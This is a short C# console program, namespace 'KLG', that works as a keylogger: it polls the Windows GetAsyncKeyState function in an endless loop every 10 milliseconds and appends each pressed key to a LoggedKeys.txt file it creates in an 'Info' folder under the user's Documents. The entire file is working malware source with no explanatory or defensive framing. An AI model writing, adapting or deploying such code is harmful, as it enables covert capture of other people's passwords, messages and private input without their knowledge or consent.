using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace KLG
{
    class Program
    {
        [DllImport(("User32.dll"))]

        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            String filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            filePath = filePath + @"\Info\";

            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }

            string path = (@filePath + "LoggedKeys.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }

            KeysConverter converter = new KeysConverter();
            string text = "";

            while (true)
            {
                Thread.Sleep(10);
                for (int i = 0; i < 2000; i++)
                {
                    int key = GetAsyncKeyState(i);

                    if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.WriteLine(text);
                        }

                        break;
                    }
                }
            }







        }
    }
}
